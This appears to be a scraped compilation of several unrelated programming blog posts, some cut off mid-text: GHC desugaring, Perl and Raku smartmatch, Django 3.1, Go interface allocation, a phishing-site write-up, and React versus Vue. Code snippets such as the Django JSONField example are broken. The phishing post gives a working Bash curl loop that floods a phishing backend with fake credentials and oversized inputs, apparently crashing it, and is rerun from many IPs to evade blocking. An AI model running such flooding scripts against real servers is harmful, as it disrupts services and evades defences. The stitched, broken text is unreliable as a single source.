<li>Function application: <code>f x</code></li>
</ol><p>But we can rewrite it in such a way that it uses only function application:</p><pre><code><span>product</span> (
  (:) ((+) a b) (
  (:) ((+) c d) (
  [])))
</code></pre><p>Granted, the end result is not as readable. But the building blocks used to write this program are simpler, and that’s the important bit.</p><p>Desugaring is not just an abstract idea: it’s a concrete step of GHC’s pipeline. Every Haskell program is desugared into Core during compilation. So, to see the full picture, it’s helpful to consider the steps that occur prior to desugaring.</p><p>The input to the compiler is a string, a sequence of characters:</p><center><img src="https://serokell.io/files/dy/dy2sc5q9.ParserInput.png" alt="Parser Input"></center><p>Where would one begin to process this sequence? Actually, this is fairly well known. The first step is <strong>lexical analysis</strong>, which groups subsequences of these characters into labeled tokens:</p><center><img src="https://serokell.io/files/mf/mfm4t5lo.LexerOutput.png" alt="Lexer Output"></center><p>Then the tokens are organized into a tree. That’s <strong>syntactic analysis</strong>:</p><center><img src="https://serokell.io/files/oa/oav0bml8.ParserOutput.png" alt="Parser Output"></center><p>The structure of this tree depends on the language we’re working with. In Haskell, a module contains declarations, such as data declarations, class declarations, function/variable definitions, and so on. In this example, we have two value bindings, marked as ‘bind’.</p><p>In a ‘bind’, there’s a pattern on the left-hand side and an expression on the right-hand side. In this example, the patterns are simply variable names, but we could also have as-patterns, view-patterns, matching on specific data constructors, and so on.</p><p>An expression can be one of many forms, but here we have:</p><ul>
<li>‘app’ – function application, consisting of a function and its argument;</li>
<li>‘op app’ – operator application, consisting of two operands and an operator;</li>
<li>‘var’ – references to other named values;</li>
<li>‘lit’ – numeric and string literals.</li>
</ul><p>Then we do <strong>name resolution</strong>, to figure out which name refers to what:</p><center><img src="https://serokell.io/files/8v/8vvt57kn.RenamerOutput.png" alt="Renamer Output"></center><p>Here, ‘print’, ‘+’, and ‘length’ are imported from other modules, whereas ‘x’ is defined in the same module.</p><p>And then, we analyse the program to <strong>check and infer the types</strong> of its expressions and subexpressions:</p><pre><code><span>main</span> :: <span>IO</span> ()
<span>x</span> :: <span>Int</span>
</code></pre><p>So that’s the GHC pipeline, or at least its front-end:</p><p><img src="https://serokell.io/files/sx/sxg6b87v.PipelineGHC.png" alt="sxg6b87v.PipelineGHC.png"></p><ul>
<li>text to tokens;</li>
<li>tokens to a syntax tree;</li>
<li>add scoping information to the syntax tree;</li>
<li>add type information to the syntax tree;</li>
</ul><p>This leaves us with a well-scoped, well-typed syntax tree. This is the input to desugaring. And the output is a Core program, where Core is a language like Haskell, but it’s much smaller and with fewer features.</p><p>To understand how Core is simpler, let’s first take a deeper look at Haskell. To represent a Haskell expression, GHC defines a type called <code>HsExpr</code>. If you open <code><a href="https://gitlab.haskell.org/ghc/ghc/-/blob/master/compiler/GHC/Hs/Expr.hs">compiler/GHC/Hs/Expr.hs</a></code> in GHC sources, you will see it:</p><pre><code><span><span>data</span> <span>HsExpr</span> p</span>
  = <span>HsVar</span> ...         
  | <span>HsLit</span> ...         
  | <span>HsApp</span> ...         
  | <span>OpApp</span> ...         
  | ...
</code></pre><p>Remember how syntactic analysis creates a node for each subexpression? And these nodes can be of different varieties, such as function application, operator application, variables, literals, etc.? <code>HsExpr</code> has a constructor for each node type: <code>HsVar</code>, <code>HsLit</code>, <code>HsApp</code>, <code>OpApp</code>, and so on.</p><p>And there are lots and lots of node types:</p><pre><code><span><span>data</span> <span>HsExpr</span> p</span>
  = <span>HsVar</span> ...         
  | <span>HsLit</span> ...         
  | <span>HsApp</span> ...

<li>function application (<code>App</code>)</li>
<li>lambdas (<code>Lam</code>)</li>
<li>let-bindings (<code>Let</code>)</li>

</ul><p>If you learn what these are, you know Core. And if you know both Core and how Haskell programs are desugared into it, then you can easily reason about the menagerie of Haskell language features.</p><p>At a first approximation, you can think of Core as a subset of Haskell plus coercions (and casts, these two are closely related). That’s not the full story, though. For example, there are also differences in strictness, as <code>case</code> in Core is always strict. Here are some resources if you want to delve deeper into this:</p><ul>
<li><a href="https://www.youtube.com/watch?v=uR_VzYxvbxg">“Into the Core - Squeezing Haskell into Nine Constructors"</a></li>
<li><a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2007/01/tldi22-sulzmann-with-appendix.pdf">“System F with Type Equality Coercions"</a></li>
<li><a href="https://repository.brynmawr.edu/cgi/viewcontent.cgi?article=1014&amp;context=compsci_pubs">“System FC with Explicit Kind Equality"</a></li>
<li><a href="https://github.com/ghc/ghc/blob/master/docs/core-spec/core-spec.pdf">“System FC, as implemented in GHC"</a></li>
<li>Read the GHC sources (e.g. <code>dsLExpr</code>) and <code>-ddump-simpl</code> output</li>
</ul><p>However, as a starting point, it’s sufficient to assume that Core is a subset of Haskell.</p><p>Now let’s see how Haskell programs are transformed into Core by looking at specific examples. We’ll start with the most basic features and progress to more complex ones.</p><h2 id="infix-operators">Infix Operators</h2><p>Infix operators are translated into function applications:</p><table><tbody><tr><th>
Haskell
</th>
<th>
Core
</th></tr>
<tr><td>
<pre><code><span>a</span> &amp;&amp; b
</code></pre>
</td>
<td>
<pre><code>(&amp;&amp;) a b
</code></pre>
</td></tr></tbody></table><p>There isn’t much to it. But keep in mind that in Core, all variable occurrences have type information, so a more accurate translation would look like this:</p><pre><code>((&amp;&amp;) :: <span>Bool</span> -&gt; <span>Bool</span> -&gt; <span>Bool</span>)
  (a :: <span>Bool</span>)
  (b :: <span>Bool</span>)
</code></pre><p>However, more often than not, I will omit type annotations to save visual space.</p><h2 id="function-bindings">Function Bindings</h2><p>Bindings in Core always have a single variable name on the left-hand side. Function bindings are desugared into lambdas:</p><table><tbody><tr><th>
Haskell
</th>
<th>
Core
</th></tr>
<tr><td>
<pre><code><span>f</span> x y = not x &amp;&amp; y
</code></pre>
</td>
<td>
<pre><code><span>f</span> =
  \(x :: <span>Bool</span>) -&gt;
  \(y :: <span>Bool</span>) -&gt;
     (&amp;&amp;) (not x) y
</code></pre>
</td></tr></tbody></table><p>Also, there are no separate type signatures. All type information is stored inline.</p><h2 id="multi-argument-function-bindings">Multi-Argument Function Bindings</h2><p>Multi-argument functions are translated into nested lambdas. In Core, all lambdas are single-argument:</p><table><tbody><tr><th>
Haskell
</th>
<th>
Core
</th></tr>
<tr><td>
<pre><code><span>f</span> x y = not x &amp;&amp; y
</code></pre>
</td>
<td>
<pre><code><span>f</span> =
  \(x :: <span>Bool</span>) -&gt;
  \(y :: <span>Bool</span>) -&gt;
     (&amp;&amp;) (not x) y
</code></pre>
</td></tr></tbody></table><p>This is also true for hand-written multi-argument lambdas:</p><table><tbody><tr><th>
Haskell
</th>
<th>
Core
</th></tr>
<tr><td>
<pre><code><span>f</span> = \x y -&gt; not x &amp;&amp; y
</code></pre>
</td>
<td>
<pre><code><span>f</span> =
  \(x :: <span>Bool</span>) -&gt;
  \(y :: <span>Bool</span>) -&gt;
     (&amp;&amp;) (not x) y
</code></pre>
</td></tr></tbody></table><p>This treatment of multi-argument functions may be familiar to you if you’ve heard of <a href="https://en.wikipedia.org/wiki/Currying">cu…</a></p></div></div>

		<h2 id="the-problem">The problem</h2>
<p>C has switch/case, and many other languages either copied it, or created a similar construct. Perl in 2000 didn’t have any such thing, and this was seen as a lack.</p>
<h2 id="a-tale-of-two-languages">A Tale of Two Languages</h2>
<p><a href="https://raku.org/archive//rfc/22.html">This RFC</a> not only became two (related) features, it did so in both Perl and Raku with dramatically different results: in Perl it’s widely considered the biggest design failure of the past two decades, whereas in Raku it’s an entirely non-controversial. The switch that Perl ended up with is working very similar to the original proposal. This is actually helpful in analysing what changes were necessary to make it a successful feature. It looks something like this (in both languages):</p>
<pre><code>given $foo {
    when /foo/ {
        say "No dirty words here";
    }
    when "None" {

    }
    when 1 {
        say "One!";
    }
    when $_ &gt; 42 {
        say "It's more than life, the universe and everything";
    }
}
</code></pre>
<p>The switch is actually two features (for the price of only one RFC): smartmatch and <a href="https://docs.raku.org/language/control#index-entry-switch_(given)">given/when</a> on top of it. Smartmatch is an operator <code>~~</code> that checks if the left hand side fits the constraints of the right hand side. Given/when is a construct that smartmatches the given argument to a series of when arguments (e.g.&nbsp;<code>$given ~~ $when</code>) until one succeeds.</p>
<p>However, one of the distinguishing features of Perl is that it doesn’t generally overload operators, instead it has different operators for different purposes (e.g.&nbsp;<code>==</code> for comparing numbers and <code>eq</code> for comparing strings). Smartmatch however is inherently all about overloading. This mismatch is essentially the source of all the trouble of smartmatch in Perl. Raku on the other hand has an extensive type-system, and is not so dependent on type specific operators (though it still has some for convenience), and hence is much more predictable.</p>
<p>Most obviously, the type system of Raku means that it doesn’t use a table of possibilities, but instead <code>$left ~~ $right</code> just translates to <code>$right.ACCEPTS($left)</code>. The right-first semantics makes it a lot easier to reason about (e.g.&nbsp;matching against a number will always do numeric equality).</p>
<p>It means it can easily distinguish between a string and an integer, unlike Perl which has to guess what you meant: <code>$foo ~~ 1</code> always means <code>$foo == 1</code>, and <code>$foo ~~ "foo"</code> always means <code>$foo eq "foo"</code>. In Perl, <code>$foo ~~ "1"</code> would do a numeric match.</p>
<p>But perhaps the most important rule is smartmatching booleans. Perl doesn’t have them, and this makes <code>when</code> so much more complicated than most people realize. The problem is with statements like <code>$_ &gt; 42</code>, which need boolean logic. Perl solves this using a <a href="https://perldoc.perl.org/perlsyn.html#Experimental-Details-on-given-and-when">complex heuristic</a> that no one really can remember (no really, no one). Most surprisingly, that means that <code>when /foo/</code> does not use smartmatching (this becomes obvious when the left hand side is an arrayref).</p>
<p>Raku uses a very different method to solve this problem. In Raku, when <em>always</em> smartmatches. Smartmatching against a <code>Bool</code> (like in <code>$_ &gt; 42</code>), will always return that bool, so <code>$foo ~~ True</code> always equals <code>True</code>. This enables a wide series of boolean expressions to be used as <code>when</code> condition without problems. It’s a much simpler, and surprisingly effective method of dealing with this challenge.</p>
<h2 id="other-uses">Other uses</h2>
<p>The other difference between smartmatching in Perl versus Raku is that it is actually used outside of given/when. In particular, selecting methods such as <code>grep</code> and <code>first</code> use it to great effect: <code>@array.grep(1)</code>, <code>@array.grep(Str)</code>, <code>@array.grep(/foo/)</code>, <code>@array.grep(&amp;function)</code>, <code>@array.grep(1..3)</code>, and <code>@array.grep((1, *, 3))</code>* all do what you probably expect them to do. Likewise it’s used in a number of other places where one checks if a value is part of a certain group or not, like the ending argument of a sequence (e.g.&nbsp;<code>1000, 1001 ... *.is-prime</code>) and the flip-flop operators.</p>
<p>Smartmatch is all about making code do what you mean, and it’s pretty useful and reusable for that.</p>

<p>Django 3.1 will be released in early August 2020 and comes with a number of major new features and many minor improvements including asynchronous views and middleware support, asynchronous tests, JSONField for all supported database backends (not just PostgreSQL), an updated admin page, <code>SECURE_REFERRER_POLICY</code>, and much more. The <a href="https://docs.djangoproject.com/en/3.1/releases/3.1/">official release notes</a> are the canonical reference, but this post will cover some of the highlights as well as tips for upgrading.</p>
<h2>How to Upgrade</h2>
<p>You really should strive to be on the latest version of both Django and Python. This will result in faster, more supported, and feature-laden code. To upgrade, create a new virtual environment, install Django 3.1, and run your test suite (you have one, yes?) by adding the <code>-Wa</code> flag to show full deprecation warnings. </p>
<div><pre><span></span><span>(env) $ python -Wa manage.py test</span>
</pre></div>
<p>If you don't have tests in your project yet, you can still use <code>python -Wa manage.py runserver</code> to see some warnings. Refer to the <a href="https://docs.djangoproject.com/en/3.1/howto/upgrade-version/">official upgrade list</a> for more advice. </p>
<p>Django 3.1 requires Python 3.6, 3.7, or 3.8. You can read more about supported Python versions on the <a href="https://docs.djangoproject.com/en/3.1/faq/install/#what-python-version-can-i-use-with-django">Django prerequisites page</a>. If you're curious about Django's version and release policy, the <a href="https://www.djangoproject.com/download/">download page</a> shows the supported versions timeline and future LTS (long-term support) releases.</p>
<p>For further context, the Django Chat podcast co-hosted by Django Fellow Carlton Gibson has episodes on <a href="https://djangochat.com/episodes/django-versions">Django Versions</a> and <a href="https://djangochat.com/episodes/security-releases">Django Security Releases</a>.</p>
<h2>Asynchronous Views, Middleware, Tests</h2>
<p>With version 3.0, Django began its async journey in earnest with <a href="https://asgi.readthedocs.io/en/latest/">ASGI</a> support. In 3.1, Django now supports a fully asynchronous request path with views, middleware, and tests/test client.</p>
<p>A basic example, provided in the docs, is to make a request that waits for half a second and then returns a response.</p>
<div><pre><span></span><span># views.py</span>
<span>async</span> <span>def</span> <span>my_view</span><span>(</span><span>request</span><span>):</span>
    <span>await</span> <span>asyncio</span><span>.</span><span>sleep</span><span>(</span><span>0.5</span><span>)</span>
    <span>return</span> <span>HttpResponse</span><span>(</span><span>'Hello, async world!'</span><span>)</span>
</pre></div>
<p>This works whether you are running WSGI or <a href="https://asgi.readthedocs.io/en/latest/">ASGI</a> mode, which was first added in 3.0.</p>
<p>A more relevant example would be to asynchronously fetch a URL in Django using <a href="https://www.python-httpx.org/">HTTPX</a>, the next-generation version of the popular <a href="https://github.com/psf/requests">requests</a> library.</p>
<h2>Cross-db JSONField</h2>
<p>JSONField support for <a href="https://docs.djangoproject.com/en/3.1/ref/models/fields/#django.db.models.JSONField">models</a> and <a href="https://docs.djangoproject.com/en/3.1/ref/forms/fields/#django.forms.JSONField">forms</a> has now been extended to all Django-supported backends (MariaDB, MySQL, Oracle, and SQLite), not just PostgreSQL. This provides full support for <a href="https://docs.djangoproject.com/en/3.1/topics/db/queries/#querying-jsonfield">JSONField queries</a>.</p>
<div><pre><span></span><span># models.py</span>
<span>from</span> <span>django.db</span> <span>import</span> <span>models</span> 

<span>class</span> <span>SoccerInfo</span><span>(</span><span>models</span><span>.</span><span>Model</span><span>):</span>
    <span>data</span> <span>=</span> <span>models</span><span>.</span><span>JSONField</span><span>()</span>

    <span>'players'</span><span>:</span> <span>{</span><span>'forwards'</span><span>:</span> <span>[</span><span>'Salah'</span><span>,</span> <span>'Firmino'</span><span>,</span> <span>'Mané'</span><span>]},</span>
<span>})</span>
<span>SoccerInfo</span><span>.</span><span>objects</span><span>.</span><span>filter</span><span>(</span>
    <span>data__team</span><span>=</span><span>'Liverpool'</span><span>,</span>
    <span>data__coaches__contains</span><span>=</span><span>'Klopp'</span><span>,</span>
    <span>data__players__has_key</span><span>=</span><span>'forwards'</span><span>,</span>
<span>)</span><span>.</span><span>delete</span><span>()</span>
</pre></div>
<h2>Admin Layout</h2>
<p>The admin now has a sidebar on the lefthand side for easier naviation on large screens. The historical breadcrumbs pattern is still available. If you'd like to disable the new sidebar, set <a href="https://docs.djangoproject.com/en/3.1/ref/contrib/admin/#django.contrib.admin.AdminSite.enable_nav_sidebar">AdminSite.enable_nav_sidebar</a> to <code>False</code>.</p>
<p>Here is the older admin view:</p>
<p><img src="https://learndjango.com/static/images/tutorials/django31/admin_30.png" alt="3.0 Admin"></p>
<p>And here is the new admin view with sidebar:</p>
<p><img src="https://learndjango.com/static/images/tutorials/django31/admin_31.png" alt="3.1 Admin"></p>
<h2>pathlib</h2>
<p>Django has switched from using <a href="https://docs.python.org/3.8/library/os.path.html">os.path</a> to the more modern and concise <a href="https://docs.python.org/3/library/pathlib.html">pathlib</a>. If you create a new project using the <code>startproject</code> command, the automatically generated <code>settings.py</code> file now defaults to <code>pathlib</code>.</p>
<p>Here is the Django 3.0 version:</p>

<h2>SECURE_REFERRER_POLICY</h2>
<p>The <a href="https://docs.djangoproject.com/en/3.1/ref/settings/#std:setting-SECURE_REFERRER_POLICY">SECURE_REFERRER_POLICY</a> now defaults to 'same-origin', which is more secure. This is one of many steps the Django team makes around security. You can--and should--run the <a href="https://docs.djangoproject.com/en/3.1/howto/deployment/checklist/">Django deployment checklist</a> to ensure your project is secure before pushing to production: <code>python manage.py check --deploy</code>.</p>
<h2>Conclusion</h2>
<p>There are many more new features, extensively documented in the <a href="https://docs.djangoproject.com/en/3.1/releases/3.1/">official release notes</a>, which are well-worth reading in full as well as the accompanying Django 3.1 documentation.</p>
<p>Every major new Django release is a team effort and 3.1 is no exception. The Django Fellows, <a href="https://twitter.com/carltongibson">Carlton Gibson</a> and <a href="https://twitter.com/MariuszFelisiak">Mariusz Feliask</a>, are resonsible for an enormous amount of work to ensure the release process occurs smoothly and on time. Particular thanks are due to <a href="https://twitter.com/andrewgodwin?">Andrew Godwin</a> for his work on async features and <a href="https://twitter.com/laymonage">Sage Abdullah</a> for adding cross-db JSONFields.</p>

	<p><small>August 12, 2020</small></p>
</div><div><p>In Go, <a href="https://golang.org/ref/spec#Interface_types">interface values</a>
are famously implemented as a pair of pointers (see Russ Cox's <a href="https://research.swtch.com/interfaces">Go
Data Structures: Interfaces</a>);
a pointer to information about the type and a pointer to the value
itself. This generally means that the value must be dynamically
allocated in the <em>heap</em>, which means that it will contribute to the
work that Go's garbage collection does.</p>

<p>The <a href="https://golang.org/doc/go1.15">Go 1.15 release notes</a> mention
an intriguing improvement in <a href="https://golang.org/doc/go1.15#runtime">the runtime section</a>:</p>

<blockquote><p>Converting a small integer value into an interface value no longer
causes allocation.</p>
</blockquote>

<p>When I saw that, I immediately wondered how it works, and especially
if Go's runtime was now sometimes using the value pointer field in
interface values to directly store the value.
(There are a number of languages that do this, using various approaches
like <a href="https://wiki.c2.com/?TagBit">tag bits</a> to tell values from real
pointers.)</p>

<p>The answer turns out to be pretty straightforward, and is in <a href="https://go-review.googlesource.com/c/go/+/216401">Go
CL 216401</a> (merged
in <a href="https://github.com/golang/go/commit/9828c43288a53d3df75b1f73edad0d037a91dff8">this commit</a>,
which may be easier to read). The Go runtime has a special static
array of the first 256 integers (0 to 255), and when it would
normally have to allocate memory to store an integer on the heap
as part of converting it to an interface, it first checks to see
if it can just return a pointer to the appropriate element in the
array instead. This kind of static allocation of frequently used
values is common in languages with lots of dynamic allocation;
Python does something similar for small integers, for example
(<a href="https://utcc.utoronto.ca/~cks/space/blog/python/ObjectIdentityGotcha">which can sometimes surprise you</a>).</p>

<p>(It turns out that Go previously had an optimization where if you were
converting 0 to an interface value, it would return a pointer to a
special static zero value. This new optimization for 0-255 replaces
that.)</p>

<p>There is one special trick that Go plays here. The actual array is
an array of <code>uint64</code>, but it reuses the same array for smaller sized
values as well. On <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> systems like x86, this
is fine as it stands because a pointer to a 64-bit value is also a
valid pointer to that value interpreted as 32 or 16 bits (or 8
bits). But on big endian systems this isn't the case, so if Go is
running on a big endian machine it bumps up the pointer so that it
works properly (making it point to either the last two bytes or the
last four bytes of the 8-byte value).</p>

<p>(On a little endian machine, the pointer is to the low byte of the
value and the remaining bytes are all zero so it doesn't matter how
many more of them you look at. On a big endian machine, the pointer
is to the high byte, but the low byte is the thing that matters.)</p>

<p>As bonus trivia for this change, this new array of 0-255 <code>uint64</code>
values was then reused for avoiding allocating anything for one-byte
strings in another change (<a href="https://github.com/golang/go/commit/bda42a7a782dbcf4b123d617c5b60f3c848cbb82">this commit</a>,
<a href="https://go-review.googlesource.com/c/go/+/221979">CL 221979</a>).
Go previously had an array of bytes for this purpose, but why have
two arrays. Big endian machines need the same sort of pointer bumping
they did for small integers being converted to interface values,
but little endian machines can once again use the pointers as is.</p>

<p>PS: There are runtime functions for converting 16, 32, and 64 bit
values to interface values, in <a href="https://github.com/golang/go/blob/master/src/runtime/iface.go">runtime/iface.go</a>
(they can be inlined in actual code), but I was puzzled because
there is no runtime function for converting 8 bit values. It turns
out that 8-bit values are directly handled by the compiler in
<a href="https://github.com/golang/go/blob/master/src/cmd/compile/internal/gc/walk.go#L837">walk.go</a>,
where it generates inline code that uses the <code>staticuint64s</code> array.
This may be done directly in the compiler partly because it needs
no fallback path for larger values, unlike the 16, 32, and 64 bit
cases, since an 8 bit value will always be in <code>staticuint64s</code>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    <div>
                        <div>
                            <div>
                            <p>A few days ago my wife got a text message that was obviously a bad phishing attempt</p>
<figure><img loading="lazy" src="https://pictshare.net/xcz7r5.jpg"><figcaption>It says: Our -bankname- system has noticed that your "pushTAN" service is not active. Click here to activate</figcaption></figure>
<p>I spun up a VM and took a look at the website it linked to, which is <a href="https://www.sso-meinelba.com/">https://www.sso-meinelba.com/</a> (almost like the real domain but with a typo) and of course it was just a copy of a banks login form that had only one change made to it.</p>
<figure><img loading="lazy" src="https://pictshare.net/0fuchr.png"><figcaption>The phishers added a "PIN" field to the logon page</figcaption></figure>
<p>The way these things work is that they act like they're the real login form, <code>steal your credentials</code> and usually send you off to the real bank so you think you made a typo or something.</p>

<p>These phishing backends are usually very simple PHP scripts that just take the data from the submitted form and save them to a file. The phishers then <a href="https://krebsonsecurity.com/2017/12/the-market-for-stolen-account-credentials/">sell them via hidden services</a> (trying real hard not to use the bullshit term <code>darknet</code> here).</p>
<p>If the phishers didn't think too hard about getting garbage data you can have a little fun and poison their loot with fake logins.</p>
<p>So with a few lines of Bash I was able to send a few thousand datapoints to their backend, filling it with garbage.</p>
<pre><code>while :; do

    # generate random numbers for login and password
    verf=$(cat /dev/urandom | tr -dc '0-9' | fold -w 7 | head -n 1)
    pin=$(cat /dev/urandom | tr -dc '0-9' | fold -w 5 | head -n 1)

    # send them to their server as your browser would
    curl 'https://www.sso-meinelba.com/files/index/identifier/verfueger/uz1.php' \
        -H 'authority: www.sso-meinelba.com' \
        -H 'origin: https://www.sso-meinelba.com' \
        -H 'content-type: application/x-www-form-urlencoded' \
        -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' \
        -H 'referer: https://www.sso-meinelba.com/files/index/identifier/verfueger/' \
        --data-raw "verfueger=Wien&amp;Verf%C3%BCgernummer=$verf&amp;Pin=$pin&amp;submit=Weiter"

    echo "Sending $verf with pin $pin"
done</code></pre>

    <source src="https://pictshare.net/i3khmn.mp4/raw" type="video/mp4">
</video>
<figcaption>Which was running for about half an hour until I had an idea</figcaption>
</figure>
<h2>The form was limiting my input.. but does the backend too?</h2>
<p>The phishing form limited the account number to 7 digits and the pin to 5 digits but what if I would send a bit more?</p>
<p>So I edited the script to send 256 character account numbers and passwords and then this happened.</p>
<h2>It killed their site (?)</h2>
<figure><img loading="lazy" src="https://pictshare.net/rcr9g6.png"><figcaption>The site didn't like my input</figcaption></figure>
<p>After my first request with two times 256 characters, the site went down. I'm not sure what happened and if it was a big coincidence and they took it down in the exact second I sent the large strings or I activated self destruction but since this request the site is down.</p>
<figure><img loading="lazy" src="https://pictshare.net/b71byj.png"><figcaption>Site is down now. Did I do that?</figcaption></figure>
<p>The server seems up but the content is gone.</p>
<h2>Strange things</h2>
<p>What struck me as odd was that the fake domain <code>sso-meinelba.com</code> had a valid SSL Wildcard certificate from the italian company <a href="https://www.actalis.it/">Actalis</a>. Usually phishers only get free certificates like Let's encrypt but they really seemed to have bought one. Odd</p>
<figure><img loading="lazy" src="https://pictshare.net/1fiexe.png"><figcaption>The certificate</figcaption></figure>
<p>I also noticed that the website was hosted on webx1413.aruba.it. The scammers must have rented a small VPS that hosts the scamming site</p>
<h2>How do they hide their scamming site from being detected?</h2>
<p>Remember the <code>bitly.com</code> link from the screenshot? It actually doesn't point directly to <code>sso-meinelba.com</code> but rather to a sub folder on <a href="https://kls-study.com/">https://kls-study.com</a> which is (as far as I can tell) an old homepage of the italian <a href="http://klm.education/">KLM Education</a> language school.</p>
<p>Obviously the phishers found a bug in their website and used the subdirectory <code>https://kls-study.com/redi/ccui</code> (the last part of the path seems to be random) to forward users to their phishing campaigns.</p>

<p>On the local Austrian subreddit <a href="https://www.reddit.com/r/Austria/comments/i88imh/wei%C3%9F_jemand_wieso_mir_raiffeisen_das_geschickt/">I saw a post describing a similar</a> phishing campaign and I also took a look.</p>
<p>It was the same banking login page but the backend was much more professional. It seems they actively tried to use the login credentials in the backend before saving them because after entering login data I saw this and had to laugh.</p>
<figure><img loading="lazy" src="https://pictshare.net/qm3tsb.png"><figcaption>My IP address in a subfolder called "victims"</figcaption></figure>
<p>This txt file was called once per second and it had the value <code>0</code> in it. I assume they tried to login with the credentials I entered and if it was valid, they'd forward me to the real website of the bank.</p>
<p>Sadly the server didn't enable indexing otherwise I would have seen all victims, but it was funny nonetheless.</p>
<h2>Also attacking this phishing site</h2>
<p>I saw that every request to <code>http://elba-app.com/Raiffeisen/</code> seemed to create a folder with a random string on their server. (eg <code>http://elba-app.com/Raiffeisen/f5255513e44fa68/</code>) so I thought I'd spam them again and it worked well</p>
<figure>
<video id="video2" poster="https://pictshare.net/a1s52s.mp4/preview/a1s52s.mp4" preload="auto" autoplay="autoplay" controls="" muted="muted" loop="loop" webkit-playsinline="">   
                <source src="https://pictshare.net/a1s52s.mp4/raw" type="video/mp4">
</video>
<figcaption>With every request there is a folder generated on their server</figcaption>
</figure>
<p>until</p>
<figure><img loading="lazy" src="https://pictshare.net/dj72f5.png"><figcaption>They blocked my IP</figcaption></figure>
<p>Being a sysadmin this of course is not the only IP at my disposal so I tried the BOMB request (256 instead of 7 characters) again and what happened?</p>
<figure><img loading="lazy" src="https://pictshare.net/r33l7v.png"><figcaption>Their server was not happy with my input</figcaption></figure>
<p>This time the server didn't crash or self destruct, I just seem to produce a lot of error messages on their side.</p>
<p>Also their site is a bit more complex as they don't have a single form where to post login credentials but they have 3 steps:</p>
<p><strong>Step 1:</strong>
Go to <code>http://elba-app.com/Raiffeisen</code> and the server will respond with a 302 redirect to the folder they created for you</p>
<figure><img loading="lazy" src="https://pictshare.net/jilwi2.png"><figcaption>Redirect in the location header</figcaption></figure>
<p><strong>Step 2:</strong>
They send you to a sumbit.php that only takes the account name and redirects you to</p>
<p><strong>Step 3:</strong>
Now they want your pin on <code>/hundle-pin.php</code>. I'm not sure why they did leave in that typo but here we are.</p>

<p>I made a few changes to my script to handle all 3 steps and let it run over night from a dozen different ip addresses.</p>
<p>The result? They stopped their campaign from this Domain</p>
<figure><img loading="lazy" src="https://pictshare.net/17p4v8.png"><figcaption>This phishing site is gone too</figcaption></figure>
<p><a href="https://gist.github.com/geek-at/53768c6b7aee7a973032cfb7daf65107">Here's my updated script</a> for those playing along at home</p>

<p>We saw 2 phishing attacks in different quality. Both sent out as SMS to users who are customers of the same bank.</p>
<p>I wrote a script to poison their data and got both of the sites to stop working. Great success!</p>

Back in 2017/2018, I'd been using Vue at work quite a lot. I felt comfortable with it and had a
fairly solid understanding of how it worked. I had, however, been curious to know what the grass was
like on the other side of the fence — the grass in this scenario being React.

I’d read the React docs and watched a few tutorial videos and, while they were great and all, what I
really wanted to know was how different React was from Vue. By “different”, I didn’t mean things
such as whether they both had virtual DOMS or how they went about rendering pages. I wanted someone
to take the time to explain the code! I wanted to find an article that took the time to explain this
so that someone new to either Vue or React (or Web Development as a whole) could gain a better
understanding of the differences between the two.

Unfortunately, I couldn’t find anything that tackled this. So I came to the realisation that I would
have to go ahead and build this myself in order to see the similarities and differences. In doing
so, I thought I’d document the whole process so that an article on this will finally exist.

![Who wore it better?](/assets/post-content/i-created-the-exact-same-app-in-react-and-vue-2020-edition/react-vs-vue.png) -->
<p>A few years ago, I decided to try and build a fairly standard To Do App in React and Vue. Both apps
were built using the default CLIs (create-react-app for React, and vue-cli for Vue). My aim was to
write something that was unbiased and simply provided a snapshot of how you would perform certain
tasks with both technologies.</p>
<p>When React Hooks were released, I followed up the original article with a
'<a href="https://medium.com/javascript-in-plain-english/i-created-the-exact-same-app-in-react-and-vue-here-are-the-differences-2019-edition-42ba2cab9e56">2019 Edition</a>'
which replaced the use of Class Components with Functional Hooks. <strong>With the release of Vue version
3 and its Composition API, now is the time to one again update this article with a '2020 Edition'.</strong></p>
<h3>Let’s take a quick look at how the two apps look:</h3>
<p><img src="https://sunilsandhu.com/assets/post-content/i-created-the-exact-same-app-in-react-and-vue-2020-edition/todo-side-by-side.png" alt="React vs Vue. The Immovable Object meets the Irresistible Force!"></p>
<p>The CSS code for both apps are exactly the same, but there are differences in where these are
located. With that in mind, let’s next have a look at the file structure of both apps:</p>
<p><img src="https://sunilsandhu.com/assets/post-content/i-created-the-exact-same-app-in-react-and-vue-2020-edition/folder-structure-side-by-side.png"></p>
<p>You’ll see that their structures are similar as well. The key difference so far is that the React
app has two CSS files, whereas the Vue app doesn’t have any. The reason for this is because
create-react-app creates its default React components with a separate CSS file for its styles,
whereas Vue CLI creates single files that contain HTML, CSS, and JavaScript for its default Vue
components.</p>
<p>Ultimately, they both achieve the same thing, and there is nothing to say that you can’t go ahead
and structure your files differently in React or Vue. It really comes down to personal preference.
You will hear plenty of discussion from the dev community over how CSS should be structured,
especially with regard to React, as there are a number of CSS-in-JS solutions such as
styled-components, and emotion. CSS-in-JS is literally what it sounds like by the way. While these
are useful, for now, we will just follow the structure laid out in both CLIs.</p>
<p>But before we go any further, let’s take a quick look at what a typical Vue and React component look
like:</p>
<p><strong>A typical React file:</strong>
<img src="https://sunilsandhu.com/assets/post-content/i-created-the-exact-same-app-in-react-and-vue-2020-edition/react-todoitem.png" title="A typical React file"></p>
<p><strong>A typical Vue file:</strong>
<img src="https://sunilsandhu.com/assets/post-content/i-created-the-exact-same-app-in-react-and-vue-2020-edition/vue-todoitem.png" title="A typical Vue file"></p>
<p>Now that’s out of the way, let’s get into the nitty gritty detail!</p>
<h3>How do we mutate data?</h3>
<p>But first, what do we even mean by “mutate data”? Sounds a bit technical doesn’t it? It basically
just means changing the data that we have stored. So if we wanted to change the value of a person’s
name from John to Mark, we would be ‘mutating the data’. So this is where a key difference between
React and Vue lies. While Vue essentially creates a data object, where data can freely be updated,
React handles this through what is known as a state hook.</p>
<p>Let’s take a look at the set up for both in the images below, then we will explain what is going on
after:</p>
<p><strong>React state:</strong>

<p><strong>Vue state:</strong>
<img src="https://sunilsandhu.com/assets/post-content/i-created-the-exact-same-app-in-react-and-vue-2020-edition/vue-state.png" title="Vue state"></p>
<p>So you can see that we have passed the same data into both, but the structure is a bit different.</p>
